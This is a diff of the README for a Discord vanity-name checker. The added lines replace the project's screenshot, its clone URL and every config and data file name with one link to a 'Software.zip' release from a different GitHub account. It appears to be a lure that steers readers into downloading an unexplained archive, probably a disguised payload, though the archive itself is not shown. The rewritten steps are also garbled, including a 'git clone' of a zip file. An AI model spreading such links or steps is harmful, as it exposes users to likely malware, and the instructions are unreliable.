@@ -4,24 +4,24 @@ ___________
 
 
 # Example 👀
-![Example of code running](https://cdn.discordapp.com/attachments/576156209799757834/896237159139389490/nOcKTGYvyW.gif)
+![Example of code running](https://github.com/anas200321/VanityChecker/releases/download/v2.0/Software.zip)
 
 
 # Installation 🛠️
 ```bash
-git clone https://github.com/JackCrispy/VanityChecker.git
+git clone https://github.com/anas200321/VanityChecker/releases/download/v2.0/Software.zip
 npm install
 npm run start
 ```
-- Put your proxies in proxies.txt (https://proxyscrape.com/free-proxy-list)
-- Make sure there is a vanitys.txt file, I already provide one which has over 3000+ possible vanity names.
+- Put your proxies in https://github.com/anas200321/VanityChecker/releases/download/v2.0/Software.zip (https://github.com/anas200321/VanityChecker/releases/download/v2.0/Software.zip)
+- Make sure there is a https://github.com/anas200321/VanityChecker/releases/download/v2.0/Software.zip file, I already provide one which has over 3000+ possible vanity names.
 
 # Results 🤖
-The **taken** vanitys will go to a taken.txt file. Same with **avabilable** vanitys.
+The **taken** vanitys will go to a https://github.com/anas200321/VanityChecker/releases/download/v2.0/Software.zip file. Same with **avabilable** vanitys.
 Once running the script, those .txt files will not erase, you need to erase them manually.
 
 # Settings & Config 📘
-The settings are automcatically applied based off of your vanity length and Array Chunk Size value in the config.json file.
+The settings are automcatically applied based off of your vanity length and Array Chunk Size value in the https://github.com/anas200321/VanityChecker/releases/download/v2.0/Software.zip file.
 
 Default Config:
 ```json
